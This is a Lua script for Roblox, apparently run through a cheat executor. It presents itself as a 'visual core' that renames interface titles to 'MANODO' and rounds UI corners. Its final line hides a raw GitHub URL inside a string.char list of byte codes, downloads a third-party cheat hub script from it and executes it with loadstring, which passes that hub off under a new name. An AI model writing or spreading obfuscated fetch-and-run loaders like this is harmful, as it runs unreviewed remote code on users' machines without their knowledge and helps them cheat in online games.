
--[[ STAGE 2: VISUAL CORE ]]
local HubName = "MANODO"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            -- 1. ЗАГОЛОВКИ (Smart Filter)
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            
            -- 2. СКРУГЛЕНИЯ (Modern UI)
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end
    
    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
    end)
end

Hook()
loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 110, 111, 116, 122, 97, 110, 111, 99, 111, 100, 100, 122, 52, 47, 66, 111, 98, 72, 117, 98, 47, 109, 97, 105, 110, 47, 80, 108, 97, 99, 101, 47, 66, 108, 105, 110, 100, 83, 104, 111, 116, 46, 108, 117, 97)))()
